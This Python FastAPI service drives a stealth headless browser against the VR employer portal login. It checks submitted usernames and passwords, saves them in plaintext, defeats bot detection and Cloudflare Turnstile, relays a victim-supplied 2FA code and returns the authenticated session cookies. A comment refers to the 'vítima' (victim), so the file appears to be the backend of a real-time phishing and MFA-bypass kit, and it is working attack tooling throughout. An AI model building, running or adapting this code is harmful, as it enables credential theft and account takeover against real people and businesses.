import asyncio
import json
import logging
import os
from datetime import datetime
from pathlib import Path
from typing import Optional

from fastapi import FastAPI
from pydantic import BaseModel
import uvicorn
from playwright.async_api import async_playwright, Browser, BrowserContext, Page, Playwright

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("vr-worker")

app = FastAPI(title="VR SSO Auth Worker", version="2.0.0")

DADOS_JSON = Path("dados.json")
RESULTADO_JSON = Path("resultado.json")

URL_LOGIN = "https://superportal-empregador.vr.com.br/"
SELECTOR_USERNAME = "#username"
SELECTOR_PASSWORD = "#password"
SELECTOR_CONTINUAR = 'button[data-action-button-primary="true"]'
MFA_URL_PATTERN = "**/u/mfa-email-challenge?state=*"

class TesteRequest(BaseModel):
    usuario: str
    senha: str

class Injetar2FARequest(BaseModel):
    usuario: str
    codigo: str

class WorkerState:
    playwright: Optional[Playwright] = None
    browser: Optional[Browser] = None
    context: Optional[BrowserContext] = None
    page: Optional[Page] = None
    is_ready: bool = False
    lock: asyncio.Lock = asyncio.Lock()

state = WorkerState()
active_sessions: dict[str, dict] = {}
pending_challenges: dict[str, dict] = {}
SESSION_TIMEOUT_SECONDS = 300
CHALLENGE_TIMEOUT_SECONDS = 180
PROXY_URL = os.getenv("PROXY_URL", "").strip()

async def obter_browser():
    """Garante que a instância do Chromium esteja conectada com auto-recovery."""
    try:
        if state.browser and state.browser.is_connected():
            return state.browser
    except Exception:
        pass

    logger.info("[WARM WORKER] Conectando motor Chromium com evasão stealth...")
    try:
        if state.playwright:
            try:
                await state.playwright.stop()
            except Exception:
                pass
        state.playwright = await async_playwright().start()
        state.browser = await state.playwright.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-infobars",
                "--window-size=1280,800",
                "--lang=pt-BR,pt"
            ]
        )
        state.context = None
        state.page = None
    except Exception as e:
        logger.error(f"[WARM WORKER] Falha ao iniciar browser: {e}")
        raise e
    return state.browser

async def criar_contexto_stealth():
    """Cria contexto isolado com evasão de fingerprint, spoofing de WebGL e atributos reais de navegador."""
    await obter_browser()
    proxy_config = {"server": PROXY_URL} if PROXY_URL else None
    context = await state.browser.new_context(
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        viewport={"width": 1280, "height": 800},
        locale="pt-BR",
        timezone_id="America/Sao_Paulo",
        proxy=proxy_config
    )
    await context.add_init_script("""
        // 1. Mascara flags de automação
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        try { delete navigator.__proto__.webdriver; } catch (e) {}

        // 2. Emula runtime real do Google Chrome
        window.chrome = {
            runtime: {
                OnInstalledReason: {},
                OnRestartRequiredReason: {},
                PlatformArch: {},
                PlatformNaclArch: {},
                PlatformOs: {},
                RequestUpdateCheckStatus: {}
            },
            loadTimes: function() {},
            csi: function() {},
            app: {}
        };

        // 3. Emula plugins e idiomas realistas
        Object.defineProperty(navigator, 'languages', { get: () => ['pt-BR', 'pt', 'en-US', 'en'] });
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
        Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });

        // 4. WebGL Vendor & Renderer Spoofing (evita detecção de SwiftShader / Mesa de Datacenter)
        try {
            const getParam = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(parameter) {
                if (parameter === 37445) return 'Google Inc. (Intel)';
                if (parameter === 37446) return 'ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)';
                return getParam.apply(this, arguments);
            };
            if (window.WebGL2RenderingContext) {
                const getParam2 = WebGL2RenderingContext.prototype.getParameter;
                WebGL2RenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445) return 'Google Inc. (Intel)';
                    if (parameter === 37446) return 'ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)';
                    return getParam2.apply(this, arguments);
                };
            }
        } catch (e) {}

        // 5. Permissão de notificações mockada
        if (navigator.permissions && navigator.permissions.query) {
            const origQuery = navigator.permissions.query;
            navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    origQuery(parameters)
            );
        }
    """)
    return context

async def tentar_resolver_turnstile(p: Page, timeout_seconds: float = 4.5) -> bool:
    """Detecta a presença do Cloudflare Turnstile, interage com o checkbox e aguarda geração do token."""
    logger.info("[WARM WORKER] Verificando e resolvendo desafio Cloudflare Turnstile...")
    token_gerado = False
    limite = int(timeout_seconds / 0.3)

    for i in range(limite):
        # 1. Verifica se o input oculto cf-turnstile-response já recebeu o token
        try:
            cf_input = p.locator('input[name="cf-turnstile-response"]').first
            if await cf_input.count() > 0:
                val = await cf_input.get_attribute("value")
                if val and len(val.strip()) > 10:
                    logger.info(f"[WARM WORKER] ✅ Token Turnstile confirmado ({len(val)} chars)!")
                    return True
        except Exception:
            pass

        # 2. Varre frames procurando o checkbox interativo do Turnstile
        try:
            for f in p.frames:
                if "challenges.cloudflare.com" in f.url or "turnstile" in f.url:
                    box = f.locator('input[type="checkbox"], .ctp-checkbox-label, #challenge-stage, .mark, body').first
                    if await box.count() > 0 and await box.is_visible():
                        logger.info("[WARM WORKER] Clicando no checkbox interativo do Cloudflare Turnstile...")
                        await box.click(delay=40)
                        await asyncio.sleep(0.4)
                        break
        except Exception:
            pass

        await asyncio.sleep(0.3)

    # Verificação final do token
    try:
        cf_input = p.locator('input[name="cf-turnstile-response"]').first
        if await cf_input.count() > 0:
            val = await cf_input.get_attribute("value")
            if val and len(val.strip()) > 10:
                return True
    except Exception:
        pass

    return False

async def preparar_pagina():
    """Pré-carrega o formulário do SSO da VR com cookies e bundles em memória gerando state dinâmico."""
    try:
        state.is_ready = False
        await obter_browser()

        # Tenta reaproveitar a página existente (navegação interna muito mais rápida)
        if state.page and not state.page.is_closed():
            try:
                logger.info("[WARM WORKER] Reciclando aba em memória...")
                if state.context:
                    try:
                        await state.context.clear_cookies()
                    except Exception:
                        pass
                await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=25000)
                await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=20000)
                await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=20000)
                state.is_ready = True
                logger.info("[WARM WORKER] ✅ Aba 100% pronta e reciclada!")
                return
            except Exception as rec_err:
                logger.warning(f"[WARM WORKER] Falha ao reciclar aba: {rec_err}. Recriando...")
                try:
                    await state.page.close()
                except Exception:
                    pass

        # Cria novo contexto com stealth se necessário
        if not state.context:
            state.context = await criar_contexto_stealth()

        state.page = await state.context.new_page()
        logger.info("[WARM WORKER] Carregando nova aba no SSO da VR com state dinâmico...")
        await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=30000)
        await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=25000)
        await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=25000)

        state.is_ready = True
        logger.info("[WARM WORKER] ✅ Página 100% pronta e pré-aquecida para autenticação instantânea!")
    except Exception as e:
        logger.error(f"[WARM WORKER] Erro ao pré-aquecer página: {e}")
        state.is_ready = False
        await asyncio.sleep(2)
        asyncio.create_task(preparar_pagina())

async def limpar_sessoes_expiradas():
    """Remove periodicamente sessões de MFA e desafios Turnstile inativos que excederam os limites."""
    while True:
        try:
            await asyncio.sleep(20)
            agora = asyncio.get_event_loop().time()

            # 1. Limpa sessões de MFA expiradas (>300s)
            expirados_mfa = []
            for k, sess in list(active_sessions.items()):
                if agora - sess.get("created_at", 0) > SESSION_TIMEOUT_SECONDS:
                    expirados_mfa.append(k)
            for k in expirados_mfa:
                sess = active_sessions.pop(k, None)
                if sess:
                    logger.info(f"[WARM WORKER] Limpando sessão MFA expirada (>300s): {k}")
                    try:
                        p = sess.get("page")
                        if p and not p.is_closed():
                            await p.close()
                        c = sess.get("context")
                        if c:
                            await c.close()
                    except Exception:
                        pass

            # 2. Limpa desafios Turnstile pendentes (>180s)
            expirados_desafios = []
            for k, sess in list(pending_challenges.items()):
                if agora - sess.get("created_at", 0) > CHALLENGE_TIMEOUT_SECONDS:
                    expirados_desafios.append(k)
            for k in expirados_desafios:
                sess = pending_challenges.pop(k, None)
                if sess:
                    logger.info(f"[WARM WORKER] Limpando contexto de desafio pendente (>180s): {k}")
                    try:
                        p = sess.get("page")
                        if p and not p.is_closed():
                            await p.close()
                        c = sess.get("context")
                        if c:
                            await c.close()
                    except Exception:
                        pass

        except Exception as e:
            logger.error(f"[WARM WORKER] Erro no reaper de sessões: {e}")

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(preparar_pagina())
    asyncio.create_task(limpar_sessoes_expiradas())

@app.on_event("shutdown")
async def shutdown_event():
    logger.info("[WARM WORKER] Encerrando Chromium e Playwright...")
    for k, sess in list(active_sessions.items()):
        try:
            p = sess.get("page")
            if p and not p.is_closed():
                await p.close()
            c = sess.get("context")
            if c:
                await c.close()
        except Exception:
            pass
    active_sessions.clear()

    for k, sess in list(pending_challenges.items()):
        try:
            p = sess.get("page")
            if p and not p.is_closed():
                await p.close()
            c = sess.get("context")
            if c:
                await c.close()
        except Exception:
            pass
    pending_challenges.clear()

    if state.page and not state.page.is_closed():
        await state.page.close()
    if state.context:
        await state.context.close()
    if state.browser:
        await state.browser.close()
    if state.playwright:
        await state.playwright.stop()

@app.get("/health")
async def health():
    return {
        "status": "ready" if state.is_ready else "warming",
        "has_browser": state.browser is not None and state.browser.is_connected() if state.browser else False,
        "is_ready": state.is_ready
    }

def salvar_resultado_local(usuario: str, senha: str, valido: bool, mensagem: str, url_final: str = "", status_credencial: str = "invalido"):
    novo_log = {
        "data_hora": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "valido": valido,
        "status_credencial": status_credencial,
        "nome": usuario,
        "senha": senha,
        "mensagem": mensagem,
        "url_final": url_final
    }

    logs = []
    if RESULTADO_JSON.exists():
        try:
            with open(RESULTADO_JSON, "r", encoding="utf-8-sig") as f:
                logs = json.load(f)
                if not isinstance(logs, list):
                    logs = []
        except Exception:
            logs = []

    logs.append(novo_log)
    try:
        with open(RESULTADO_JSON, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Erro ao gravar resultado.json: {e}")

@app.post("/testar")
async def testar_credenciais(req: TesteRequest):
    usuario = req.usuario.strip()
    senha = req.senha

    async with state.lock:
        if not state.is_ready or not state.page or state.page.is_closed():
            logger.warning("[WARM WORKER] Página não estava pronta, aguardando carregamento...")
            await preparar_pagina()

        page = state.page
        inicio = asyncio.get_event_loop().time()
        logger.info(f"[WARM WORKER] Testando instantaneamente: {usuario}")

        try:
            # 1. Preenchimento com digitação natural para disparar listeners do React/Auth0
            user_input = page.locator(SELECTOR_USERNAME).first
            pass_input = page.locator(SELECTOR_PASSWORD).first

            await user_input.click()
            await user_input.fill("")
            await user_input.type(usuario, delay=30)

            await pass_input.click()
            await pass_input.fill("")
            await pass_input.type(senha, delay=30)

            # 1.1 Pré-resolução ativa de Cloudflare Turnstile antes de submeter
            try:
                await tentar_resolver_turnstile(page, timeout_seconds=4.0)
                await asyncio.sleep(0.3)
            except Exception:
                pass

            btn = page.locator(SELECTOR_CONTINUAR).first
            if await btn.count() > 0:
                await btn.click()
            else:
                await page.keyboard.press("Enter")

            # 2. Loop de detecção ativa (300ms)
            resultado_valido = None
            status_credencial = "invalido"
            msg_resultado = ""
            turnstile_detectado = False

            for _ in range(25): # até ~7.5s max
                await asyncio.sleep(0.3)
                url_atual = page.url

                # Se avançou para MFA -> Válido
                if "mfa-email-challenge" in url_atual or "mfa" in url_atual.lower():
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Login válido - etapa de código encontrada"
                    break

                # Se detectou erro no DOM -> Diferencia erro real de senha vs erro de desafio/Turnstile
                try:
                    erro_locator = page.locator("#error-element-password, [data-error-code], .ulp-alert-danger, .ulp-input-error-message, .alert-danger, span[id*='error']")
                    count = await erro_locator.count()
                    if count > 0:
                        for i in range(count):
                            el = erro_locator.nth(i)
                            if await el.is_visible():
                                txt = (await el.inner_text()).strip()
                                err_code = (await el.get_attribute("data-error-code") or "").strip()
                                full_err = f"{txt} {err_code}".lower()

                                # Erro 600010: falha de carregamento do desafio Turnstile
                                if "600010" in full_err or "desafio de segurança" in full_err or "turnstile" in full_err or "captcha" in full_err:
                                    logger.info("[WARM WORKER] 🛡️ Desafio Turnstile detectado no DOM. Tentando resolver...")
                                    turnstile_detectado = True
                                    resolvido = await tentar_resolver_turnstile(page, timeout_seconds=3.5)
                                    if resolvido:
                                        btn_retry = page.locator(SELECTOR_CONTINUAR).first
                                        if await btn_retry.count() > 0:
                                            await btn_retry.click()
                                            await asyncio.sleep(0.8)
                                            continue
                                    resultado_valido = False
                                    status_credencial = "bloqueio_captcha"
                                    msg_resultado = f"Desafio de segurança da VR pendente (Código: {txt or err_code})"
                                    break
                                elif any(k in full_err for k in ["incorret", "inválid", "invalido", "senha", "não encontramos", "verifique seus dados", "credenciais", "password"]):
                                    resultado_valido = False
                                    status_credencial = "invalido"
                                    msg_resultado = f"Credenciais incorretas na VR: {txt}"
                                    break
                                elif txt:
                                    resultado_valido = False
                                    status_credencial = "invalido"
                                    msg_resultado = f"Erro reportado pela VR: {txt}"
                                    break
                        if resultado_valido is False:
                            break
                except Exception:
                    pass

                # Detecta e tenta auto-resolver Cloudflare Turnstile
                try:
                    for f in page.frames:
                        if "challenges.cloudflare.com" in f.url or "turnstile" in f.url:
                            turnstile_detectado = True
                            try:
                                box = f.locator('input[type="checkbox"], .ctp-checkbox-label, #challenge-stage, body').first
                                if await box.count() > 0 and await box.is_visible():
                                    await box.click()
                            except Exception:
                                pass
                            break
                    if not turnstile_detectado:
                        cf_el = page.locator("iframe[src*='turnstile'], iframe[src*='challenges.cloudflare.com'], .cf-turnstile, #cf-turnstile")
                        if await cf_el.count() > 0:
                            turnstile_detectado = True
                except Exception:
                    pass

            url_final = page.url
            if resultado_valido is None:
                if "mfa-email-challenge" in url_final or "mfa" in url_final.lower():
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Login válido - etapa de código encontrada"
                elif turnstile_detectado:
                    resultado_valido = False
                    status_credencial = "bloqueio_captcha"
                    msg_resultado = "Bloqueio Cloudflare Turnstile detectado no SSO da VR (verificação humana pendente)"
                else:
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = "Login inválido ou etapa de código não encontrada."

            duracao = asyncio.get_event_loop().time() - inicio
            logger.info(f"[WARM WORKER] Veredito em {duracao:.2f}s: {status_credencial.upper()} ({msg_resultado})")

            salvar_resultado_local(usuario, senha, resultado_valido, msg_resultado, url_final, status_credencial=status_credencial)

            user_key = usuario.lower().strip()
            if resultado_valido:
                # Preserva a aba e o contexto na sessão de espera para o 2FA
                logger.info(f"[WARM WORKER] 🔒 Preservando sessão de MFA ativa para {usuario} em active_sessions...")
                active_sessions[user_key] = {
                    "page": page,
                    "context": state.context,
                    "usuario": usuario,
                    "created_at": asyncio.get_event_loop().time()
                }
                state.page = None
                state.context = None
                asyncio.create_task(preparar_pagina())
            elif status_credencial == "bloqueio_captcha":
                # Preserva o contexto e aba aberta para tentativa posterior sem recarregar tudo
                logger.info(f"[WARM WORKER] 🛡️ Preservando aba com desafio Turnstile para {usuario} em pending_challenges...")
                pending_challenges[user_key] = {
                    "page": page,
                    "context": state.context,
                    "usuario": usuario,
                    "senha": senha,
                    "created_at": asyncio.get_event_loop().time()
                }
                state.page = None
                state.context = None
                asyncio.create_task(preparar_pagina())
            else:
                # Recicla a aba normalmente em caso de senha inválida
                asyncio.create_task(preparar_pagina())

            return {
                "success": True,
                "usuario": usuario,
                "valido": resultado_valido,
                "status_credencial": status_credencial,
                "mfa_ativo": bool(resultado_valido),
                "mensagem": msg_resultado,
                "tempo_segundos": round(duracao, 2),
                "url_final": url_final
            }

        except Exception as err:
            logger.error(f"[WARM WORKER] Falha na execução: {err}")
            asyncio.create_task(preparar_pagina())
            return {
                "success": False,
                "usuario": usuario,
                "valido": False,
                "status_credencial": "invalido",
                "mensagem": f"Erro interno no worker: {err}"
            }

@app.post("/retestar")
async def retestar_sso(req: TesteRequest):
    """Re-executa a tentativa de login aproveitando o contexto de desafio existente ou criando nova aba."""
    usuario = req.usuario.strip()
    user_key = usuario.lower()
    senha = req.senha

    sess_pendente = pending_challenges.pop(user_key, None)
    if sess_pendente and sess_pendente.get("page") and not sess_pendente["page"].is_closed():
        p: Page = sess_pendente["page"]
        ctx: Optional[BrowserContext] = sess_pendente.get("context")
        logger.info(f"[WARM WORKER] Re-testando desafio em aba viva para {usuario}...")
        try:
            ok = await tentar_resolver_turnstile(p, timeout_seconds=5.0)
            btn = p.locator(SELECTOR_CONTINUAR).first
            if await btn.count() > 0:
                await btn.click()
            else:
                await p.keyboard.press("Enter")

            for _ in range(20):
                await asyncio.sleep(0.3)
                url_atual = p.url
                if "mfa-email-challenge" in url_atual or "mfa" in url_atual.lower():
                    logger.info(f"[WARM WORKER] 🎉 Desafio vencido na re-tentativa para {usuario}! Promovendo para active_sessions...")
                    active_sessions[user_key] = {
                        "page": p,
                        "context": ctx,
                        "usuario": usuario,
                        "created_at": asyncio.get_event_loop().time()
                    }
                    salvar_resultado_local(usuario, senha, True, "Login válido após re-tentativa - MFA encontrado", url_atual, "valido")
                    return {
                        "success": True,
                        "usuario": usuario,
                        "valido": True,
                        "status_credencial": "valido",
                        "mfa_ativo": True,
                        "mensagem": "Desafio resolvido com sucesso! Etapa MFA pronta.",
                        "url_final": url_atual
                    }

            # Se ainda persistir em desafio
            pending_challenges[user_key] = sess_pendente
            return {
                "success": True,
                "usuario": usuario,
                "valido": False,
                "status_credencial": "bloqueio_captcha",
                "mfa_ativo": False,
                "mensagem": "Desafio Cloudflare Turnstile ainda pendente na VR."
            }
        except Exception as re_err:
            logger.warning(f"[WARM WORKER] Falha na aba pendente ({re_err}). Descartando e iniciando teste normal...")
            try:
                await p.close()
                if ctx:
                    await ctx.close()
            except Exception:
                pass

    return await testar_credenciais(req)

@app.post("/limpar-memoria")
async def limpar_memoria():
    """Fecha todas as abas e contextos ativos e pendentes para garantir Zero Test Pollution."""
    logger.info("[WARM WORKER] Limpando todas as sessões e desafios em memória...")
    for k, sess in list(active_sessions.items()):
        try:
            p = sess.get("page")
            if p and not p.is_closed():
                await p.close()
            c = sess.get("context")
            if c:
                await c.close()
        except Exception:
            pass
    active_sessions.clear()

    for k, sess in list(pending_challenges.items()):
        try:
            p = sess.get("page")
            if p and not p.is_closed():
                await p.close()
            c = sess.get("context")
            if c:
                await c.close()
        except Exception:
            pass
    pending_challenges.clear()

    asyncio.create_task(preparar_pagina())
    return {"success": True, "mensagem": "Memória e contextos purgados com sucesso."}

@app.get("/sessoes")
async def listar_sessoes():
    """Retorna a contagem e status das sessões de MFA aguardando código."""
    agora = asyncio.get_event_loop().time()
    lista = []
    for k, s in active_sessions.items():
        idade = round(agora - s.get("created_at", 0), 1)
        p = s.get("page")
        lista.append({
            "usuario": s.get("usuario", k),
            "idade_segundos": idade,
            "expira_em": max(0, round(SESSION_TIMEOUT_SECONDS - idade, 1)),
            "ativa": p is not None and not p.is_closed()
        })
    return {
        "total_sessoes": len(lista),
        "sessoes": lista
    }

@app.post("/injetar-2fa")
async def injetar_2fa(req: Injetar2FARequest):
    """Injeta o código de segurança 2FA no SSO oficial da VR na aba em espera."""
    usuario = req.usuario.strip()
    user_key = usuario.lower()
    codigo = req.codigo.strip()

    session = active_sessions.get(user_key)
    if not session or not session.get("page") or session["page"].is_closed():
        logger.warning(f"[WARM WORKER] Sessão de MFA não encontrada ou expirada para: {usuario}")
        return {
            "success": False,
            "valido": False,
            "mensagem": "Sessão de MFA expirada ou não encontrada na VR. Por favor, realize o login novamente."
        }

    page: Page = session["page"]
    context: Optional[BrowserContext] = session.get("context")
    logger.info(f"[WARM WORKER] Injetando código 2FA para {usuario}: {codigo}")

    try:
        # Seletores mapeados do Auth0 Universal Login da VR (/u/mfa-email-challenge)
        code_selectors = [
            'input[name="code"]',
            'input#code',
            'input[autocomplete="one-time-code"]',
            'input[type="tel"]',
            'input[type="text"]'
        ]

        input_encontrado = None
        for sel in code_selectors:
            loc = page.locator(sel)
            if await loc.count() > 0 and await loc.first.is_visible():
                input_encontrado = loc.first
                break

        if not input_encontrado:
            try:
                await page.wait_for_selector('input[name="code"], input#code', timeout=3000)
                input_encontrado = page.locator('input[name="code"], input#code').first
            except Exception:
                pass

        if not input_encontrado:
            logger.error(f"[WARM WORKER] Campo de código 2FA não encontrado no DOM para {usuario}")
            return {
                "success": False,
                "valido": False,
                "mensagem": "Campo de código 2FA não localizado no SSO da VR."
            }

        # Limpa e digita o código com delay natural
        await input_encontrado.fill("")
        await input_encontrado.type(codigo, delay=40)

        # Clica no botão de submissão
        btn_continue = page.locator('button[type="submit"], button[data-action-button-primary="true"], button:has-text("Continuar"), button:has-text("Verificar")').first
        if await btn_continue.count() > 0:
            await btn_continue.click()
        else:
            await page.keyboard.press("Enter")

        # Avaliação de resposta em até 6.5s
        resultado_2fa = None
        msg_2fa = ""

        for _ in range(22):
            await asyncio.sleep(0.3)
            url_atual = page.url

            # Caso de Sucesso: Navegou para fora de mfa-email-challenge
            if "mfa-email-challenge" not in url_atual and ("authorize/resume" in url_atual or "superportal" in url_atual or "vr.com.br" in url_atual or "callback" in url_atual):
                if "error=" not in url_atual:
                    resultado_2fa = True
                    msg_2fa = "2FA autenticado com sucesso no SSO da VR"
                    break

            # Caso de Erro: Alerta de código inválido no DOM
            try:
                erro_locator = page.locator("#error-element-code, .ulp-alert-danger, [data-error-code], .ulp-input-error-message, .alert-danger, span[id*='error']")
                if await erro_locator.count() > 0:
                    for i in range(await erro_locator.count()):
                        el = erro_locator.nth(i)
                        if await el.is_visible():
                            txt = (await el.inner_text()).strip()
                            if txt:
                                resultado_2fa = False
                                msg_2fa = f"Código incorreto na VR: {txt}"
                                break
                if resultado_2fa is False:
                    break
            except Exception:
                pass

        if resultado_2fa is None:
            if "mfa-email-challenge" not in page.url:
                resultado_2fa = True
                msg_2fa = "2FA autenticado com sucesso no SSO da VR"
            else:
                resultado_2fa = False
                msg_2fa = "Código 2FA incorreto ou não reconhecido pela VR."

        cookies = []
        if resultado_2fa:
            logger.info(f"[WARM WORKER] 🎉 2FA APROVADO para {usuario}! Aguardando redirecionamento até superportal-empregador...")
            try:
                # Aguarda o redirecionamento sair de authorize/resume e atingir o portal do empregador
                for _ in range(25): # até ~7.5s
                    if page.is_closed():
                        break
                    curr_url = page.url
                    if "superportal" in curr_url or "empregador" in curr_url:
                        break
                    await asyncio.sleep(0.3)

                if not page.is_closed():
                    await page.wait_for_load_state("networkidle", timeout=3000)
            except Exception:
                pass

            try:
                url_final = page.url if not page.is_closed() else url_atual
            except Exception:
                url_final = "https://superportal-empregador.vr.com.br/"

            if not url_final or "authorize/resume" in url_final or "sso-acesso" in url_final:
                url_final = "https://superportal-empregador.vr.com.br/"

            logger.info(f"[WARM WORKER] URL Final da Sessão: {url_final}. Capturando cookies...")
            try:
                if context:
                    cookies = await context.cookies()
                else:
                    cookies = await page.context.cookies()
            except Exception as ce:
                logger.warning(f"Erro ao capturar cookies de sessão: {ce}")

            # Encerra a aba agora que a autenticação está concluída
            try:
                await page.close()
                if context:
                    await context.close()
            except Exception:
                pass
            active_sessions.pop(user_key, None)

            return {
                "success": True,
                "valido": True,
                "mensagem": msg_2fa,
                "cookies": cookies,
                "total_cookies": len(cookies),
                "url_final": url_final
            }
        else:
            logger.warning(f"[WARM WORKER] ❌ 2FA RECUSADO pela VR para {usuario}: {msg_2fa}")
            # Mantém a aba aberta para a vítima poder digitar o código correto novamente
            return {
                "success": True,
                "valido": False,
                "mensagem": msg_2fa,
                "url_final": url_final
            }

    except Exception as e:
        logger.error(f"[WARM WORKER] Exceção ao injetar 2FA: {e}")
        return {
            "success": False,
            "valido": False,
            "mensagem": f"Erro interno ao processar código: {e}"
        }

if __name__ == "__main__":
    host = os.getenv("HOST", "127.0.0.1")
    port = int(os.getenv("PORT", "3005"))
    uvicorn.run("bot_service:app", host=host, port=port, log_level="info")
